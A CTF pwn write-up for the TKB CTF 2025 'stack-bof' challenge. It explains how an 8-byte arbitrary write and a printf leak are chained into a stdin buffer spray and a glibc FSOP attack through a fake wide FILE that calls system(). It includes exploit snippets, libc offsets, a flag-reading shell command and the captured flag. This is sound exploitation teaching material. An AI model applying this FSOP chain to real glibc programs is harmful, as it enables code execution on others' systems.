---
title: "stack-bof writeup"
description: "The bug is not the final `gets()` by itself. The real primitive is:"
event: "TKB CTF"
year: 2025
category: pwn
tags: ["pwn","rop","fsop","docker"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "tkbctf/stack-bof"
featured: false
flagsHidden: false
---

> Imported from [tkbctf/stack-bof](https://github.com/R3izorr/CTF_writeup/tree/main/tkbctf/stack-bof).

# stack-bof writeup

## TL;DR

The bug is not the final `gets()` by itself. The real primitive is:

```c
read(0, &dest, 8);
read(0, dest, 8);
```

That gives us one 8-byte arbitrary write. With the leaked `printf` address we recover the libc base, use the write to enlarge `stdin`'s buffer, and then turn the final `gets()` into a libc `.data` spray. From there we do FSOP by overwriting `_IO_list_all` and building a fake wide `FILE` object that calls `system()` during process exit.

The final remote flag was:

```text
tkbctf{*** stack smashing not detected ***}
```

## Files

- `main.c`: challenge source
- `stack-bof`: challenge binary
- `exploit.py`: working solve script
- `Dockerfile`: shows the flag is renamed to `/flag-<md5>.txt`

## Source review

The whole challenge is basically this:

```c
int main() {
  char buf[8];
  uint64_t* dest = 0;
  printf("printf: %p\n", printf);

  read(0, &dest, 8);
  read(0, dest, 8);

  gets(buf);
}
```

Protections:

- Full RELRO
- Stack canary
- NX
- PIE
- SHSTK
- IBT

So a normal `gets()` -> ret2libc plan is a bad fit. The canary blocks the simple stack smash, RELRO blocks GOT overwrites, and CET makes ROP less comfortable anyway.

## Intended primitive

This pair:

```c
read(0, &dest, 8);
read(0, dest, 8);
```

means:

1. We choose a pointer value.
2. The program writes 8 bytes to that pointer.

So we get a single arbitrary 8-byte write.

The `printf` leak gives us a libc pointer, so ASLR/PIE are no longer a problem:

```python
printf_addr = leak
libc_base = printf_addr - 0x60100
```

## Why `stdin` matters

The constructor does:

```c
setvbuf(stdin, NULL, _IONBF, 0);
```

So `stdin` is unbuffered. In glibc this means `stdin` uses its internal 1-byte `_shortbuf`.

That is the key trick:

- overwrite `stdin->_IO_buf_end`
- leave `_IO_buf_base` alone
- now glibc thinks `stdin` has a much bigger readable area

When `gets()` runs, glibc refills `stdin` into memory starting from the `_shortbuf` region inside `_IO_2_1_stdin_`, which lives in libc `.data`.

So instead of a tiny stack overwrite, we get a large controlled write into libc global data.

## Turning `gets()` into a libc spray

In the solve script:

- `stdin = libc_base + 0x2038e0`
- `_shortbuf` start used by the spray is `stdin + 0x83`
- we arbitrarily write to `stdin + 0x40`, which is `_IO_buf_end`
- the new end is set to `libc_base + 0x204b00`

The third-stage payload starts with `'\n'`:

```python
spray[0] = 0x0A
```

That is important. It makes `gets()` return immediately, so the stack canary is never corrupted.

At the same time, the read/refill already copied our large payload into libc memory.

## Avoiding a crash

Because we are spraying over the live `stdin` object, we need to preserve a few fields so `gets()` can finish normally:

- the `stdin` lock pointer
- `stdin->_wide_data`
- the normal `FILE` vtable pointer

In `exploit.py` that is:

```python
put(start + 5,  p64(libc_base + LOCK_OFF))
put(start + 13, p64(0xffffffffffffffff))
put(start + 29, p64(libc_base + STDIN_WIDE_OFF))
put(start + 85, p64(libc_base + FILE_JUMPS_OFF))
```

## FSOP plan

After the `stdin` spray lands, we overwrite `_IO_list_all` so glibc's exit-time flush walks our fake stream.

### Step 1: overwrite `_IO_list_all`

```python
put(libc_base + LIST_ALL_OFF, p64(fake))
```

### Step 2: build a fake `FILE`

The fake `FILE` is placed in libc `.data` inside the sprayed region.

The first bytes of that fake object are also used as the command string for `system(fp)`.

### Step 3: use the wide-file path

The fake stream is set up with:

- `_mode = 1`
- `_wide_data = wide`
- vtable = `_IO_wfile_jumps`

The fake `wide_data` is set so `_IO_flush_all()` believes there is buffered wide output:

```python
put(wide + 0x18, p64(0))  # _IO_write_base
put(wide + 0x20, p64(8))  # _IO_write_ptr > _IO_write_base
put(wide + 0x30, p64(0))
put(wide + 0x38, p64(0))
put(wide + 0xE0, p64(wvtable))
```

Then the fake wide vtable slot at `+0x68` is set to `system`:

```python
put(wvtable + 0x68, p64(libc_base + SYSTEM_OFF))
```

When the process exits, glibc flushes `_IO_list_all`, reaches our fake stream, enters the wide flush path, and eventually calls that function pointer with `rdi = fp`.

So we get:

```c
system(fp);
```

Since the first bytes of `fp` are our command string, we get command execution.

## Why the final command was `echo /f*;cat /f*`

The Dockerfile shows the flag is renamed to:

```text
/flag-<md5>.txt
```

At first glance, `cat /f*` looks enough. Locally, command shape turned out to matter because the command bytes sit inside the fake `FILE` header, and some byte patterns were less reliable than others.

What worked reliably on the remote service was:

```sh
echo /f*;cat /f*
```

This has two benefits:

1. `echo /f*` prints the exact remote flag filename.
2. `cat /f*` then prints the flag contents.

That is why `exploit.py` defaults to:

```python
command = os.environ.get("CMD", "echo /f*;cat /f*").encode()
```

## Offsets used

These are the libc offsets used by the solve script:

```python
PRINTF_OFF      = 0x60100
STDIN_OFF       = 0x2038E0
STDIN_WIDE_OFF  = 0x2039C0
FILE_JUMPS_OFF  = 0x202030
WFILE_JUMPS_OFF = 0x202228
LIST_ALL_OFF    = 0x2044C0
LOCK_OFF        = 0x205720
SYSTEM_OFF      = 0x58750
```

Spray/fake-object layout:

```python
FAKE_OFF      = 0x204700
WIDE_OFF      = 0x204800
FAKE_LOCK_OFF = 0x204900
WVTABLE_OFF   = 0x204A00
END_OFF       = 0x204B00
```

## Exploit flow

1. Read the leaked `printf` pointer.
2. Compute `libc_base`.
3. Use the arbitrary 8-byte write to set `stdin->_IO_buf_end` to a much larger value.
4. Send the rest of the payload in the same stream so `gets()` refills `stdin` with our large libc spray.
5. Start the spray with `'\n'` so `gets()` returns immediately and the canary stays intact.
6. Preserve the fields `stdin` still needs.
7. Overwrite `_IO_list_all`.
8. Build a fake wide `FILE`, fake `wide_data`, and fake wide vtable.
9. Put `system` in the wide vtable slot used during exit-time flush.
10. Let the process exit and print the flag.

## Running the solve

Remote:

```bash
python3 exploit.py REMOTE
```

Local process:

```bash
python3 exploit.py
```

Override the command if needed:

```bash
CMD='echo TEST' python3 exploit.py REMOTE
```

Override host/port:

```bash
HOST=127.0.0.1 PORT=5000 python3 exploit.py REMOTE
```

## Remote result

Running the final solve against the provided service printed:

```text
/flag-502478dd7251648db84a40d803f1c61c.txt
tkbctf{*** stack smashing not detected ***}
```

